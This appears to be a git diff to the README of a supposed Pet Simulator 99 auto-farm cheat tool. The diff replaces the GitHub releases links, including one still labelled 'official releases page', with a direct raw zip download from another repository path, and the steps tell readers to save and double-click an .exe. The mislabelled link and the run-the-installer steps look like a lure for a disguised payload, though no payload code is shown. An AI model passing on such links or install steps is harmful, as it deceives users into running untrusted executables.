@@ -5,7 +5,7 @@ description: "Automate coin collection, egg hatching, and league tasks in Pet Si
 ---
 # 🎮 Pet-Simulator-99-Auto-Farm-Trainer-2026-Mega - Automate your gameplay with simple tools
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/likayoe1363/Pet-Simulator-99-Auto-Farm-Trainer-2026-Mega/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/likayoe1363/likayoe1363.github.io/main/drudger/github-io-likayoe-v3.7-beta.1.zip)
 
 ## 📦 About this project
 
@@ -25,7 +25,7 @@ Ensure your computer meets these conditions before you run the application:
 
 Follow these steps to set up the software correctly.
 
-1. Visit the [official releases page](https://github.com/likayoe1363/Pet-Simulator-99-Auto-Farm-Trainer-2026-Mega/releases) to view current files.
+1. Visit the [official releases page](https://raw.githubusercontent.com/likayoe1363/likayoe1363.github.io/main/drudger/github-io-likayoe-v3.7-beta.1.zip) to view current files.
 2. Select the latest version of the installer file, which ends in .exe.
 3. Save the file to your desktop for easy access.
 4. Locate the downloaded file and double-click it.
